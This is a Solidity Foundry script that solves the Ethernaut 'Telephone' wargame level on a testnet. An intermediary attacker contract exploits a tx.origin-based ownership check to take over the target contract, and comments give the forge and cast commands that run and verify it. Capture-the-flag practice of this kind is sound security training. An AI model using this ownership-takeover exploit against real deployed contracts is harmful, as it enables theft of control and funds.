// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../../src/ethernaut/04.sol";

// forge script script/ethernaut/04.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <ADDRESS> --broadcast -vvvv --tc TelephoneScript
// forge verify-contract --rpc-url $SEPOLIA_RPC_URL --etherscan-api-key $ETHERSCAN_API_KEY --watch 0x3EfA3019534262609b4f2BBeb343e7a50a309E80 script/ethernaut/04.s.sol:TelephoneAttacker
// cast call --rpc-url $SEPOLIA_RPC_URL 0xF4c7E44c9e81272557D795126Ff8e7F12C702cFB "owner()(address)"

contract TelephoneAttacker {
    Telephone public telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}

contract TelephoneScript is Script {
    Telephone public telephoneContract = Telephone(0xF4c7E44c9e81272557D795126Ff8e7F12C702cFB);

    function run() public {
        vm.startBroadcast();

        console.log("Telephone owner (before): ", telephoneContract.owner());

        // Deploy the attacker ON-CHAIN inside the broadcasted transaction
        TelephoneAttacker attacker = new TelephoneAttacker(address(telephoneContract));
        console.log("TelephoneAttacker deployed at: ", address(attacker));

        attacker.attack();
        console.log("Telephone owner (after): ", telephoneContract.owner());

        vm.stopBroadcast();
    }
}
